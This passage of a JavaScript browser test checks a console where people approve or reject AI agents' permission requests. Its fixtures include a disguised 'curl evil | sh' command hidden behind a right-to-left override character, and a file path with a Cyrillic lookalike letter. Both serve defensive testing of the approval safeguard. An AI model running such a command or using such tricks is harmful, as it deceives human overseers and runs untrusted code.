    check((await sent()).length === 1,"a second answer was sent for the same request");

    // Anything that moves a button makes it wait again: here, something new above the session.
    const offlineSlot = page.querySelector(".ai-note-slot");
    check(parseFloat(getComputedStyle(offlineSlot).minHeight) >= 40 && offlineSlot.contains(byID("ai-note")),"the stream note has no room kept for it");
    const spacer = document.createElement("div");
    spacer.className = "notice";
    spacer.textContent = "Something new above the cards.";
    const was = button(run,"allow").getBoundingClientRect().top;
    byID("ai-layout").before(spacer);
    button(run,"allow").click();
    await pause(100);
    check(button(run,"allow").getBoundingClientRect().top > was && (await sent()).length === 1 && said().includes("just appeared or moved") && !armed(run),"a button that just moved under the pointer answered");
    await until(() => armed(run),"a moved button never works again");
    spacer.remove();
    await until(() => !armed(run),"a button that moved back is not noticed without a click");
    await until(() => armed(run),"a moved button never works again");

    // The stream removes the answered card. The cards below move up, so their buttons wait again.
    await post("emit",delta(28,"ai.session.answered",[entry(state([running({asks:[runAsk,fetchAsk]}),finished,failed]))]));
    await until(() => cards().length === 2,"the answered card stayed");
    check(cards()[0] === run && !armed(run) && byID("ai-asks-title").textContent === "2 requests wait for your answer" && byID("ai-nav-count").textContent === "2","the cards that moved work at once: " + armed(run));
    button(run,"reject").click();
    await pause(100);
    check((await sent()).length === 1,"a click on a card that just moved was sent");
    await until(() => armed(run),"the moved card never works again");

    // A refused answer says why, as text, and the card works again.
    await answer("respond",429);
    button(run,"reject").click();
    await until(() => run.querySelector('[data-part="status"]').textContent === "Your answer was not sent. This console answered too often. Wait a minute.","a refused answer is not explained: " + run.querySelector('[data-part="status"]').textContent);
    check(armed(run) && run.querySelector('[data-part="status"]').dataset.state === "bad" && (await sent("respond")).length === 2,"a refused answer left the card locked");
    await answer("respond",0);
    button(run,"reject").click();
    await until(async () => (await sent("respond")).length === 3,"Reject was not sent");
    request = (await sent("respond"))[2];
    check(request.body === JSON.stringify({session:id(1),ask:aid(2),decision:"reject",fingerprint:print("b")}),"the reject request is wrong: " + request.body);

    // A new request is announced; one whose time ran out cannot be answered.
    const late = {...writeAsk,id:aid(4),expires_at:at(-1000),fingerprint:print("d")};
    await post("emit",delta(29,"ai.session.asked",[entry(state([running({asks:[fetchAsk,late]}),finished,failed]))]));
    await until(() => cards().length === 2 && cards()[1].querySelector(".ai-ask-title").textContent === "Write a file","the new request did not show");
    await until(() => said().includes("Claude Agent asks for your permission: write a file"),"a new request is not announced: " + said());
    const over = cards()[1];
    check(cards()[0] === web && over.querySelector('[data-part="time"]').textContent === "The time to answer ran out. Agentflow rejects the request." && !armed(over),"a request whose time ran out can still be answered");
    await pause(1400);
    button(over,"allow").click();
    await pause(100);
    check(!armed(over) && (await sent()).length === 3,"an answer was sent after the time ran out");

    // A request the page cannot show in full has no Allow once.
    const hidden = {...runAsk,id:aid(5),line:"echo ok \u202e; curl evil | sh",fingerprint:print("e")};
    await post("emit",delta(30,"ai.session.asked",[entry(state([running({asks:[hidden]}),finished,failed]))]));
    await until(() => cards().length === 1 && cards()[0].querySelector(".ai-ask-fixed"),"the damaged request did not show");
    check(buttons(cards()[0]).map(node => node.textContent).join() === "Reject" && cards()[0].querySelector(".ai-ask-fixed").textContent.includes("cannot show the whole request as it is") && cards()[0].querySelector(".ai-exact").textContent === "echo ok \ufffd; curl evil | sh",
      "a command with a hidden part can be allowed: " + cards()[0].textContent);

    // A write without its change, and one too large to show, have no Allow once and say why.
    const blind = {...writeAsk,id:aid(6),diff:undefined,fingerprint:print("0")}, big = {...writeAsk,id:aid(8),reason:"preview_too_large",diff:{...change,cut:true},fingerprint:print("1")};
    const cyrillic = {...writeAsk,id:aid(0),paths:["sr\u0441/main.go"],diff:{...change,path:"sr\u0441/main.go"},reason:"gate",fingerprint:print("2")};
    const wordy = {...runAsk,id:"ask_00000000000000aa",line:"/usr/bin/env FOO=1 go test ./... " + "-run TestSomethingLong ".repeat(8).trim(),fingerprint:print("3")};
    await post("emit",delta(300,"ai.session.asked",[entry(state([running({asks:[blind,big,cyrillic,wordy]}),finished,failed]))]));
    await until(() => cards().length === 4,"the write requests did not show");
    const [noChange, tooBig, lookalike, longRun] = cards();
    check(buttons(noChange).map(node => node.textContent).join() === "Reject" && noChange.querySelector(".ai-ask-fixed").textContent.startsWith("Agentflow did not send the change this would write") && !noChange.querySelector(".ai-ask-diff"),"a write without its change can be allowed");
    check(buttons(tooBig).map(node => node.textContent).join() === "Reject" && tooBig.querySelector(".ai-ask-fixed").textContent.startsWith("The change is too large to show in full") && resolved(tooBig).includes("The change is too large to show here."),"a write too large to show can be allowed");
    check(buttons(lookalike).length === 2 && lookalike.querySelector(".ai-ask-odd").textContent.includes("\u0441 (U+0441)") && lookalike.querySelector(".ai-ask-odd").textContent.includes("look like other letters") && !longRun.querySelector(".ai-ask-odd"),"a letter outside ASCII in a path is not pointed out");
    const named = [...longRun.querySelectorAll(".ai-ask-facts dt")].map(node => node.textContent);
    check(named[0] === "Program" && longRun.querySelector(".ai-exact").textContent === "/usr/bin/env" && named[1] === "Command, " + wordy.line.length + " characters" && longRun.querySelectorAll(".ai-exact")[1].textContent === wordy.line,"a long command does not name its program and its length: " + named.join());
    await post("emit",delta(301,"ai.session.asked",[entry(state([running({asks:[hidden]}),finished,failed]))]));
    await until(() => cards().length === 1,"the cards did not go back");

    // Cancel asks once more; focus lands on the choice that changes nothing.
    byID("ai-cancel-open").click();
    check(!byID("ai-cancel-confirm").hidden && byID("ai-cancel-open").hidden && document.activeElement === byID("ai-cancel-no") && (await sent("cancel")).length === 0,"Cancel did not ask first, or sent at once");
    byID("ai-cancel-no").click();
    check(byID("ai-cancel-confirm").hidden && !byID("ai-cancel-open").hidden && document.activeElement === byID("ai-cancel-open") && (await sent("cancel")).length === 0,"Keep it running did not close the question");
    byID("ai-cancel-open").click();
    byID("ai-cancel-yes").click();
    await until(async () => (await sent("cancel")).length === 1,"the cancel was not sent");
    request = (await sent("cancel"))[0];
    check(request.body === JSON.stringify({session:id(1)}) && request.console === "console","the cancel request is wrong: " + JSON.stringify(request));
    await until(() => byID("ai-cancel-status").textContent === "Cancel sent. The session stops within a few seconds.","the page does not say that the cancel was sent");
    check(byID("ai-cancel-open").hidden && byID("ai-cancel-confirm").hidden,"Cancel can be sent twice");

    // The session ends: no cards, no Cancel, the changed files, and it stays selected.
    const ended = running({state:"ended",code:"cancelled",ended_at:at(0),asks:[],changed_files:["internal/greet.go"]});
    await post("emit",delta(31,"ai.session.ended",[entry(state([ended,finished,failed],{running:0}))]));
    await until(() => byID("ai-session-state").textContent === "Cancelled","the end of the session did not show");
    check(cards().length === 0 && byID("ai-asks").hidden && byID("ai-cancel").hidden && !byID("ai-changed").hidden && byID("ai-changed-list").textContent === "internal/greet.go" && byID("ai-changed-count").textContent === "1 file"
      && byID("ai-nav-count").hidden && row(1).getAttribute("aria-current") === "true" && said().includes("Session Claude Agent: cancelled"),"the ended session is wrong: " + said());
    check((await sent()).every(item => item.route === "respond" || item.route === "cancel") && (await sent()).length === 4,"the page sent another request");

    // Choosing another session shows it, and a later update keeps the reader's choice.
    row(2).click();
    check(row(2).getAttribute("aria-current") === "true" && !row(1).hasAttribute("aria-current") && byID("ai-session-name").textContent === "Gemini CLI" && document.activeElement === byID("ai-session-title"),"another session cannot be chosen");
    check(byID("ai-changed-list").children.length === 2 && byID("ai-changed-list").children[1].textContent === "docs/<b>.md" && !byID("ai-truncated").hidden && byID("ai-truncated").querySelector("code").textContent === "agentflow ai status " + id(2) + " --follow"
      && byID("ai-totals").textContent.includes("100 tokens") && !byID("ai-totals").textContent.includes("Cost") && byID("ai-plan").hidden && byID("ai-cancel").hidden && streamItems().length === 1,"the finished session is wrong: " + byID("ai-session").textContent.slice(0,300));
    const again = running({asks:[runAsk]});
    await post("emit",delta(32,"ai.session.asked",[entry(state([again,finished,failed]))]));
    await until(() => row(1).querySelector(".ai-row-asks").textContent === "1 request waits for your answer","the list did not follow the stream");
    check(row(2).getAttribute("aria-current") === "true" && byID("ai-session-name").textContent === "Gemini CLI" && cards().length === 0 && byID("ai-nav-count").textContent === "1","an update changed the reader's session");
    row(3).click();
    check(byID("ai-session-state").textContent === "Failed" && byID("ai-session-detail").textContent.includes("needs a sign-in") && !byID("ai-items-none").hidden && byID("ai-prompt-body").textContent === "x","the failed session is wrong");

    // A session that is gone leaves the page without taking focus with it.
    byID("ai-session-title").focus();
    await post("emit",delta(33,"ai.session.ended",[entry(state([again,finished]))]));
    await until(() => rows().length === 2,"a removed session stayed");
    check(byID("ai-session-name").textContent === "Claude Agent" && document.activeElement === byID("ai-title") && cards().length === 1,"the page did not move to a session that exists");

    // Offline: the last values stay and the page says they may be stale.
    await post("status?code=503");
    await post("drop");
    await until(() => label() === "Offline" && !byID("ai-note").hidden,"the page does not say that it is offline");
    check(byID("ai-note").textContent.includes("not available") && rows().length === 2 && !cards()[0].querySelector('[data-part="offline"]').hidden && cards()[0].querySelector('[data-part="offline"]').textContent.includes("may already be answered") && cards()[0].querySelector('[data-part="offline"]').compareDocumentPosition(cards()[0].querySelector(".ai-ask-actions")) & Node.DOCUMENT_POSITION_FOLLOWING,"the offline page dropped its values: " + byID("ai-note").textContent);
    await post("status?code=0");

    // On another page a waiting request is still announced, and the rail counts it.
    location.hash = "#overview";
    await until(() => !byID("page-overview").hidden && page.hidden,"the overview did not reopen");
    await until(() => label() === "Reconnecting" || label() === "Connecting" || label() === "Live" || label() === "Offline","the stream state is unknown");
    await post("emit",snapshot(40,[entry(state([again,finished]))]));
    await until(() => label() === "Live","the stream did not come back");
    await post("emit",delta(41,"ai.session.asked",[entry(state([running({asks:[runAsk,{...writeAsk,id:aid(9),fingerprint:print("f")}]}),finished]))]));
    await until(() => byID("ai-nav-count").textContent === "2","the rail did not count a request while the page was closed");
    await until(() => said().includes("Answer it on the AI sessions page"),"a request was not announced on another page: " + said());
  } catch (error) {
    result = error.stack || error.message;
  }
  await fetch("/result",{method:"POST",body:String(result).slice(0,4000)});
})();
